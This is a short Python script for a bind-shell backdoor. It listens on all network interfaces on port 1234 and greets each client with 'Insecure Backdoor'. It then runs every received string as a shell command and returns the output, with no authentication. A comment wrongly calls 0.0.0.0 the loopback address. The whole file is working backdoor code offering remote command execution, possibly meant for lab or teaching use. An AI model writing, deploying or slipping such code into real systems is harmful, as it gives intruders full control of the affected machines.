import socket
import os
import subprocess
import threading
from socket import error as SocketError

LOCALHOST = '0.0.0.0'  # Standard loopback interface address (localhost)
PORT = 1234       # Port to listen on (non-privileged ports are > 1023)
class ClientThread(threading.Thread):
    def __init__(self,clientAddress,clientsocket):
        threading.Thread.__init__(self)
        self.csocket = clientsocket
        print ("New connection added: ", clientAddress)
    def run(self):
        print('Connected by', clientAddress)
        self.csocket.send(b"Insecure Backdoor\n")
        while True:
            data = self.csocket.recv(1024)
            self.csocket.send(b"Command Executed\n")
            command = data.decode()
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
            output = proc.stdout.read()
            self.csocket.send(output)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((LOCALHOST, PORT))
print("Server started")
print("Waiting for clients to connect...")

while True:
    s.listen(1000)
    clientsock, clientAddress = s.accept()
    newthread = ClientThread(clientAddress, clientsock)
    newthread.start()
